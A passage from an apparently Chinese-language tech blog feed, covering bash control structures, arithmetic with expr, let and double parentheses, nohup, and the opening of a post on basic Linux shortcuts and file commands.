大于或等于，应用于整型比较;<br>-a双方都成立（and） 逻辑表达式 –a 逻辑表达式;<br>-o单方成立（or） 逻辑表达式 –o 逻辑表达式;<br>-z空字符串;<br>-x      是否具有可执行权限;<br>||      单方成立;<br>&amp;&amp;      双方都成立表达式<br></code></pre></td></tr></table></figure><h3 id="实例-—-判断学生成绩等级"><a href="#实例-—-判断学生成绩等级" class="headerlink" title="实例 — 判断学生成绩等级"></a>实例 — 判断学生成绩等级</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-comment"># this check grade shell</span><br><br>grade=<span class="hljs-variable">$1</span><br><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$grade</span> -gt 90 ];<span class="hljs-keyword">then</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Smart!&quot;</span><br><span class="hljs-keyword">elif</span> [ <span class="hljs-variable">$grade</span> -gt 80 ];<span class="hljs-keyword">then</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Good!&quot;</span><br><span class="hljs-keyword">elif</span> [ <span class="hljs-variable">$grade</span> -ge 60 ];<span class="hljs-keyword">then</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Not Bad&quot;</span><br><span class="hljs-keyword">else</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;No Pass&quot;</span><br><span class="hljs-keyword">fi</span><br></code></pre></td></tr></table></figure><h2 id="2-for-循环语句"><a href="#2-for-循环语句" class="headerlink" title="2. for 循环语句"></a>2. for 循环语句</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#格式：for name [ [ in [ word ... ] ] ; ] do list ; done</span><br><span class="hljs-keyword">for</span> 变量名 <span class="hljs-keyword">in</span> 取值列表<br><span class="hljs-keyword">do</span><br>语句 1<br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><h3 id="实例-—-打印数字-1-10"><a href="#实例-—-打印数字-1-10" class="headerlink" title="实例 —  打印数字 1-10"></a>实例 —  打印数字 1-10</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> $(<span class="hljs-built_in">seq</span> 1 10)<br><span class="hljs-keyword">do</span><br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$num</span><br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><h2 id="3-while-循环语句"><a href="#3-while-循环语句" class="headerlink" title="3. while 循环语句"></a>3. while 循环语句</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#while 关联的还有一个 until 语句，它与 while 不同之处在于，是当条件表达式为 false 时才循环，实际使用中比较少，这里不再讲解。</span><br><br><span class="hljs-keyword">while</span>  (表达式)<br><span class="hljs-keyword">do</span><br>  语句1<br>  <span class="hljs-keyword">if</span> [ 条件表达式 ];<span class="hljs-keyword">then</span><br>  <span class="hljs-built_in">break</span><br>  <span class="hljs-keyword">if</span> [ 条件表达式 ];<span class="hljs-keyword">then</span><br>  <span class="hljs-built_in">continue</span><br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><h3 id="实例-—-求和数字-1-10"><a href="#实例-—-求和数字-1-10" class="headerlink" title="实例 — 求和数字 1-10"></a>实例 — 求和数字 1-10</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">i=1<br>total=0<br><span class="hljs-keyword">while</span> ((i &lt;= 10))<br><span class="hljs-keyword">do</span><br>total=`<span class="hljs-built_in">expr</span> <span class="hljs-variable">$i</span> + <span class="hljs-variable">$total</span>`<br>((i++))<br><span class="hljs-keyword">done</span><br><br></code></pre></td></tr></table></figure><h2 id="4-case-选择语句"><a href="#4-case-选择语句" class="headerlink" title="4. case 选择语句"></a>4. case 选择语句</h2><p>对多个选择条件进行匹配输出，通常用于脚本传递输入参数，打印出输出结果及内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">case</span> 模式名  <span class="hljs-keyword">in</span><br>  模式 1)<br>    命令<br>    ;;<br>  模式 2)<br>    命令<br>    ;;<br>*)<br>不符合以上模式执行的命令<br><span class="hljs-keyword">esac</span><br><span class="hljs-comment"># 每个模式必须以右括号结束，命令结尾以双分号结束。</span><br><br></code></pre></td></tr></table></figure><h3 id="实例-—-模式选择"><a href="#实例-—-模式选择" class="headerlink" title="实例 — 模式选择"></a>实例 — 模式选择</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">read</span> -p <span class="hljs-string">&quot;请输入你的选择 start|status|quit:&quot;</span> char<br><span class="hljs-keyword">case</span> <span class="hljs-variable">$char</span> <span class="hljs-keyword">in</span><br>start)<br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;service starting...&quot;</span><br>;;<br>status)<br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;service started&quot;</span><br>;;<br>stop)<br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;service stopped&quot;</span><br>;;<br>quit)<br><span class="hljs-keyword">esac</span><br></code></pre></td></tr></table></figure><h2 id="5-select-选择语句"><a href="#5-select-选择语句" class="headerlink" title="5. select 选择语句"></a>5. select 选择语句</h2><p>类似于 for 循环，常用于选择菜单的创建，可以配合 PS3 来做打印菜单的输出信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">select i <span class="hljs-keyword">in</span> （表达式） <br><span class="hljs-keyword">do</span><br>语句<br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><h3 id="实例-—-菜单选择"><a href="#实例-—-菜单选择" class="headerlink" title="实例 — 菜单选择"></a>实例 — 菜单选择</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><br>PS3=<span class="hljs-string">&quot;Select a operation: &quot;</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">true</span>; <span class="hljs-keyword">do</span><br>select oper <span class="hljs-keyword">in</span> start status stop quit;<br> <span class="hljs-keyword">do</span><br>  <span class="hljs-keyword">case</span> <span class="hljs-variable">$oper</span> <span class="hljs-keyword">in</span><br>  start)<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;service starting...&quot;</span><br>      <span class="hljs-built_in">break</span><br>      ;;<br>  status)<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;service running...&quot;</span><br>       <span class="hljs-built_in">break</span><br>       ;;<br>  stop)<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;service stopped&quot;</span><br>       <span class="hljs-built_in">break</span><br>       ;;<br>  quit)<br>  <span class="hljs-built_in">exit</span><br>  ;;<br>  *)<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Input error, Please enter again!&quot;</span><br>      <span class="hljs-built_in">break</span><br>  <span class="hljs-keyword">esac</span><br> <span class="hljs-keyword">done</span><br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><h1 id="四、Shell-计算方式"><a href="#四、Shell-计算方式" class="headerlink" title="四、Shell 计算方式"></a>四、Shell 计算方式</h1><h2 id="1-expr-命令"><a href="#1-expr-命令" class="headerlink" title="1. expr 命令"></a>1. expr 命令</h2><p><code>expr</code>  命令可以处理 <strong>算数表达式</strong> 、<strong>字符串表达式</strong> 以及 <strong>逻辑表达式</strong>，实现数值运算，进行数值或字符串的比较，字符串的匹配、提取、统计长度，甚至可以判断变量或参数是否为整数、是否为空、是否为0等，十分强大。</p><h3 id="1-处理算数表达式"><a href="#1-处理算数表达式" class="headerlink" title="1. 处理算数表达式"></a>1. 处理算数表达式</h3><ul><li>只能处理整数运算，并且算术表达式优先级低于字符串表达式，高于逻辑关系表达式；</li><li><code>+</code> 、<code>-</code> 、<code>*</code>  、<code>/</code> 、<code>%</code>  <strong>操作符的两边都要用空格隔开</strong>。并且需要注意一些特殊的字符，例如<code>*</code>、<code>/</code>、<code>()</code> 等等。这些字符在shell中有特殊含义，需要使用 <code>\ </code> 进行转义或者 <code>&#39;&#39;</code> 包围</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">expr</span> 1 + 2<br><span class="hljs-built_in">expr</span> <span class="hljs-variable">$a</span> \* <span class="hljs-variable">$b</span><br><span class="hljs-built_in">expr</span> <span class="hljs-variable">$a</span> <span class="hljs-string">&#x27;*&#x27;</span> <span class="hljs-variable">$b</span><br></code></pre></td></tr></table></figure><h3 id="2-处理字符串表达式"><a href="#2-处理字符串表达式" class="headerlink" title="2. 处理字符串表达式"></a>2. 处理字符串表达式</h3><ul><li><code>expr STRING : REGEX</code> 等价于 <code>expr match STRING REGEX</code> ；<br>两个参数都会被视为字符格式，第二个参数会被作为正则表达式解释，并且它默认隐含前缀 ^</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@VM-centos]<span class="hljs-comment"># expr study.avi : &quot;.*avi&quot;          </span><br>9 ------- 返回匹配的字符数<br>[root@VM-centos]<span class="hljs-comment"># expr match study.avi &quot;\(.*\).avi&quot;</span><br>study -------- 返回()里的匹配到的字符<br></code></pre></td></tr></table></figure><ul><li><code>expr substr STRING POSITION LENGTH</code><br> 返回STRING字符串中从POSITION开始，长度最大为LENGTH的字符串子串。如果POSITION或LENGTH为负数、0或非数值，则返回空字符串</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@VM-centos]<span class="hljs-comment"># expr substr howareyou 4 3</span><br>are ------- 返回从第4位开始长度为3的子串<br></code></pre></td></tr></table></figure><ul><li><code>expr index STRING SUBSTR</code><br> SUBSTR中任意单个字符在STRING中最前面的字符位置。如果在STRING中完全不存在SUBSTR中的字符，则返回0</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@VM-centos]<span class="hljs-comment"># expr index Iamfine am</span><br>2 ------- 返回子串最前的起始位置<br></code></pre></td></tr></table></figure><ul><li><code>expr length STRING</code><br> 返回STRING的字符数</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@VM-centos]<span class="hljs-comment"># expr length 123456</span><br>6 ------- 返回字符串长度<br></code></pre></td></tr></table></figure><h3 id="3-处理逻辑表达式"><a href="#3-处理逻辑表达式" class="headerlink" title="3. 处理逻辑表达式"></a>3. 处理逻辑表达式</h3><ul><li>除了 <code>|</code> 和 <code>&amp;</code>   ，其余的逻辑符号在表达式为真时，返回 1，否则返回 0 </li><li><code>|</code> 和 <code>&amp;</code> 在使用时都需要转义 <code>\</code>  或用引号 <code>&#39;&#39;</code>  括起来</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@VM-centos]<span class="hljs-comment"># expr 1 \&gt; 3</span><br>0<br>[root@VM-centos]<span class="hljs-comment"># expr 0 &#x27;|&#x27; 2</span><br>2<br></code></pre></td></tr></table></figure><h2 id="2-operation"><a href="#2-operation" class="headerlink" title="2. $[operation]"></a>2. <code>$[operation]</code></h2><p> <code>$[]</code>符号的方便之处在于它对方括号内的空格无太严格的要求，同时方括号内的运算符<strong>不需要进行转义</strong>，但是它依旧<strong>只能处理整数运算</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$[ 1 + 2 ]<br></code></pre></td></tr></table></figure><h2 id="3-let-命令"><a href="#3-let-命令" class="headerlink" title="3. let 命令"></a>3. let 命令</h2><p> let命令属于内建命令，执行它的开销要少于上面两种，并且还提供了求幂运算符<code>**</code>、自加自减等， 使用let命令时需要注意一些细节: </p><ul><li>let 表达式内变量不用加 <code>$</code>  </li><li>运算符两边不可以有空格，有的话就必须用单引号或者双引号括起来 </li><li>let 后面必须是赋值表达式，即为变量赋值</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">let</span> var++             计算var变量自增<br><span class="hljs-built_in">let</span> var=3+2           运算符两边不能有空格<br></code></pre></td></tr></table></figure><h2 id="4-使用双括号"><a href="#4-使用双括号" class="headerlink" title="4. 使用双括号 (())"></a>4. 使用双括号 <code>(())</code></h2><p> <code>(())</code>也属于内建命令，并且依然<strong>只支持整型计算</strong>，双括号内的运算符<strong>不需要进行转义</strong>,  常用来计算并测试算术表达式，搭配c风格的 for，while，if 等 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 打印数字1-10</span><br><span class="hljs-keyword">for</span>((a=1;a&lt;=10;a++))<br><span class="hljs-keyword">do</span><br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$a</span><br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><h1 id="五、其他命令"><a href="#五、其他命令" class="headerlink" title="五、其他命令"></a>五、其他命令</h1><h2 id="1-nohup-命令"><a href="#1-nohup-命令" class="headerlink" title="1. nohup 命令"></a>1. nohup 命令</h2><p><code>nohup</code> 英文全称 no hang up（不挂起），用于在系统后台不挂断地运行命令，退出终端不会影响程序的运行。</p><p><strong>nohup</strong> 命令，在默认情况下（非重定向时），会输出一个名叫 <code>nohup.out</code> 的文件到当前目录下，如果当前目录的 nohup.out 文件不可写，输出重定向到 <strong>$HOME&#x2F;nohup.out</strong> 文件中。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">nohup</span> Command [ Arg … ] [　&amp; ]<br></code></pre></td></tr></table></figure><p>参数说明：</p><ul><li><code>Command</code>：要执行的命令；</li><li><code>Arg</code>：一些参数，可以指定输出文件；</li><li><code>&amp;</code>：让命令在后台执行，终端退出后命令仍旧执行。</li></ul><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p> 在后台执行 root 目录下的 test.sh 脚本，并追加输入到 &#x2F;data&#x2F;log&#x2F;test.log 文件中</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nohup /root/test.sh &gt;&gt; /data/log/test.log &amp;<br></code></pre></td></tr></table></figure><p>接下来，我们再看一个，将jar包在后台执行且将标准输出和标准错误输出都重定向到 log 中</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nohup java -jar app.jar &gt;log 2&gt;&amp;1 &amp;<br></code></pre></td></tr></table></figure><blockquote><p>这里的 <code>2&gt;&amp;1</code> 含义可参考： <a href="https://blog.csdn.net/zhaominpro/article/details/82630528">Linux shell中2&gt;&amp;1的含义解释</a> </p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>shell</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux 基础</title>
    <link href="/2022/06/16/Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
    <url>/2022/06/16/Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<h1 id="一、常用快捷键"><a href="#一、常用快捷键" class="headerlink" title="一、常用快捷键"></a>一、常用快捷键</h1><h2 id="Tab"><a href="#Tab" class="headerlink" title="[ Tab ]"></a>[ Tab ]</h2><p>自动补全，只需要输入一个命令，文件名，目录名甚至是命令选项的开头，并敲击 tab 键。它将自动完成你输入的内容，或为你显示全部可能的结果。</p><h2 id="Ctrl-C"><a href="#Ctrl-C" class="headerlink" title="[ Ctrl + C ]"></a>[ Ctrl + C ]</h2><p>立刻终止正在运行的程序或进程</p><h2 id="Ctrl-Z"><a href="#Ctrl-Z" class="headerlink" title="[ Ctrl + Z ]"></a>[ Ctrl + Z ]</h2><p>让程序在后台运行</p><h2 id="Ctrl-A"><a href="#Ctrl-A" class="headerlink" title="[ Ctrl + A ]"></a>[ Ctrl + A ]</h2><p>移动光标至所在行的行首</p><h2 id="Ctrl-E"><a href="#Ctrl-E" class="headerlink" title="[ Ctrl + E ]"></a>[ Ctrl + E ]</h2><p>移动光标至所在行的行尾</p><h2 id="Ctrl-U"><a href="#Ctrl-U" class="headerlink" title="[ Ctrl + U ]"></a>[ Ctrl + U ]</h2><p>删除当前光标至行首的全部内容</p><h2 id="Ctrl-K"><a href="#Ctrl-K" class="headerlink" title="[ Ctrl + K ]"></a>[ Ctrl + K ]</h2><p>删除当前光标至行尾的全部内容</p><h2 id="Ctrl-Y"><a href="#Ctrl-Y" class="headerlink" title="[ Ctrl + Y ]"></a>[ Ctrl + Y ]</h2><p>粘贴恢复之前删除的单词</p><h2 id="Ctrl-W"><a href="#Ctrl-W" class="headerlink" title="[ Ctrl + W ]"></a>[ Ctrl + W ]</h2><p>删除光标前的第一个单词</p><h2 id="Ctrl-P-或-↑"><a href="#Ctrl-P-或-↑" class="headerlink" title="[ Ctrl + P ] 或 [ ↑ ]"></a>[ Ctrl + P ] 或 [ ↑ ]</h2><p>查看上一个命令</p><h2 id="Ctrl-N-或-↓"><a href="#Ctrl-N-或-↓" class="headerlink" title="[ Ctrl + N ] 或 [ ↓ ]"></a>[ Ctrl + N ] 或 [ ↓ ]</h2><p>查看下一个命令</p><h2 id="Ctrl-左右键"><a href="#Ctrl-左右键" class="headerlink" title="[ Ctrl+左右键 ]"></a>[ Ctrl+左右键 ]</h2><p>在单词之间跳转</p><h1 id="二、Linux-常用命令"><a href="#二、Linux-常用命令" class="headerlink" title="二、Linux 常用命令"></a>二、Linux 常用命令</h1><h2 id="Linux-系统目录"><a href="#Linux-系统目录" class="headerlink" title="Linux 系统目录"></a>Linux 系统目录</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">├── bin -&gt; usr/bin <span class="hljs-comment"># 用于存放二进制命令</span><br>├── boot <span class="hljs-comment"># 内核及引导系统程序所在的目录</span><br>├── dev <span class="hljs-comment"># 所有设备文件的目录（如磁盘、光驱等）</span><br>├── etc <span class="hljs-comment"># 配置文件默认路径、服务启动命令存放目录</span><br>├── home <span class="hljs-comment"># 用户家目录，root用户为/root</span><br>├── lib -&gt; usr/lib <span class="hljs-comment"># 32位库文件存放目录</span><br>├── lib64 -&gt; usr/lib64 <span class="hljs-comment"># 64位库文件存放目录</span><br>├── media <span class="hljs-comment"># 媒体文件存放目录</span><br>├── mnt <span class="hljs-comment"># 临时挂载设备目录</span><br>├── opt <span class="hljs-comment"># 自定义软件安装存放目录</span><br>├── proc <span class="hljs-comment"># 进程及内核信息存放目录</span><br>├── root <span class="hljs-comment"># Root用户家目录</span><br>├── run <span class="hljs-comment"># 系统运行时产生临时文件，存放目录</span><br>├── sbin -&gt; usr/sbin <span class="hljs-comment"># 系统管理命令存放目录</span><br>├── srv <span class="hljs-comment"># 服务启动之后需要访问的数据目录</span><br>├── sys <span class="hljs-comment"># 系统使用目录</span><br>├── tmp <span class="hljs-comment"># 临时文件目录</span><br>├── usr <span class="hljs-comment"># 系统命令和帮助文件目录</span><br>└── var <span class="hljs-comment"># 存放内容易变的文件的目录</span><br></code></pre></td></tr></table></figure><h2 id="1-目录操作"><a href="#1-目录操作" class="headerlink" title="1. 目录操作"></a>1. 目录操作</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">pwd</span>查看当前工作目录<br>clear 清除屏幕<br><span class="hljs-built_in">cd</span> ~当前用户目录<br><span class="hljs-built_in">cd</span> /根目录<br><span class="hljs-built_in">cd</span> -上一次访问的目录<br><span class="hljs-built_in">cd</span> .            当前目录<br><span class="hljs-built_in">cd</span> ..上一级目录<br>ll查看当前目录下内容（LL的小写）<br></code></pre></td></tr></table></figure><h4 id="创建目录"><a href="#创建目录" class="headerlink" title="创建目录"></a>创建目录</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> aaa在当前目录下创建aaa目录，相对路径；<br><span class="hljs-built_in">mkdir</span> ./bbb在当前目录下创建bbb目录，相对路径；<br><span class="hljs-built_in">mkdir</span> /ccc在根目录下创建ccc目录，绝对路径；<br><span class="hljs-built_in">mkdir</span> -p temp/nginx  递归创建目录<br></code></pre></td></tr></table></figure><h4 id="搜索命令"><a href="#搜索命令" class="headerlink" title="搜索命令"></a>搜索命令</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name <span class="hljs-string">&#x27;b*&#x27;</span>查询根目录下（包括子目录），名以b开头的目录和文件； <br></code></pre></td></tr></table></figure><h4 id="剪切命令"><a href="#剪切命令" class="headerlink" title="剪切命令"></a>剪切命令</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mv</span>/aaa /bbb    将根目录下的aaa目录，移动到根目录下的bbb目录下(假如没有bbb目录，则重命名为bbb)；<br><span class="hljs-built_in">mv</span>bbbb usr/bbb将当前目录下的bbbb目录，移动到usr目录下，并且修改名称为bbb；<br></code></pre></td></tr></table></figure><h4 id="复制目录"><a href="#复制目录" class="headerlink" title="复制目录"></a>复制目录</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cp</span> -r /aaa /bbb将/目录下的aaa目录复制到/bbb目录下，在/bbb目录下的名称为aaa<br><span class="hljs-built_in">cp</span> -r /aa /bbb/aaa将/目录下的aa目录复制到/bbb目录下，且修改名为aaa;<br></code></pre></td></tr></table></figure><h4 id="删除目录"><a href="#删除目录" class="headerlink" title="删除目录"></a>删除目录</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">rm</span> -r /bbb普通删除。会询问你是否删除每一个文件<br><span class="hljs-built_in">rmdir</span> test01目录的删除<br><span class="hljs-built_in">rm</span> -rf /bbb强制删除/目录下的bbb目录。如果bbb目录中还有子目录，也会被强制删除，不会提示；<br></code></pre></td></tr></table></figure><h4 id="查看树状目录"><a href="#查看树状目录" class="headerlink" title="查看树状目录"></a>查看树状目录</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tree -L 1以树状形式查看当前目录下的一级目录<br></code></pre></td></tr></table></figure><h4 id="批量操作"><a href="#批量操作" class="headerlink" title="批量操作"></a>批量操作</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> &#123;dirA,dirB&#125;          批量创建测试目录<br><span class="hljs-built_in">touch</span> dirA/&#123;A1,A2,A3&#125;      dirA创建三个文件dirA/A1,dirA/A2,dirA/A3<br></code></pre></td></tr></table></figure><h2 id="2-文件操作"><a href="#2-文件操作" class="headerlink" title="2. 文件操作"></a>2. 文件操作</h2><h4 id="创建文件"><a href="#创建文件" class="headerlink" title="创建文件"></a>创建文件</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">touch</span> testFile<br></code></pre></td></tr></table></figure><h4 id="删除文件"><a href="#删除文件" class="headerlink" title="删除文件"></a>删除文件</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">rm</span> -r a.java删除当前目录下的a.java文件（每次回询问是否删除y：同意）<br><span class="hljs-built_in">rm</span> -rf a.java强制删除当前目录下的a.java文件<br><span class="hljs-built_in">rm</span> -rf ./a*强制删除当前目录下以a开头的所有文件；<br><span class="hljs-built_in">rm</span> -rf ./*强制删除当前目录下所有文件（慎用）；<br></code></pre></td></tr></table></figure><h4 id="分割文件"><a href="#分割文件" class="headerlink" title="分割文件"></a>分割文件</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@VM-8-8-centos bbb]<span class="hljs-comment"># split -b 10k system.log -d -a 3 system</span><br>[root@VM-8-8-centos bbb]<span class="hljs-comment"># ls</span><br>system000  system001  system002  system003  system004  system005  system.log<br></code></pre></td></tr></table></figure><p>以上命令将 <code>system.log</code> 文件分割成大小为 10KB 的小文件，每个小文件名以<code>system</code> 为前缀，3位数字位后缀，其中：</p><blockquote><p>-b：值为每一输出档案的大小，单位为 byte<br>-C：每一输出档中，单行的最大 byte 数<br>-d：使用数字作为后缀<br>-l：值为每一输出档的行数大小<br>-a：指定后缀长度(默认为2)</p></blockquote><h2 id="3-文件内容操作"><a href="#3-文件内容操作" class="headerlink" title="3. 文件内容操作"></a>3. 文件内容操作</h2><h4 id="修改文件内容"><a href="#修改文件内容" class="headerlink" title="修改文件内容"></a>修改文件内容</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim a.java   进入一般模式<br>i(按键)   进入插入模式(编辑模式)<br>ESC(按键)  退出<br>:wq 保存退出（<span class="hljs-built_in">shift</span>+：调起输入框）<br>:q！不保存退出（<span class="hljs-built_in">shift</span>+：调起输入框）（内容有更改）(强制退出，不保留更改内容)<br>:q不保存退出（<span 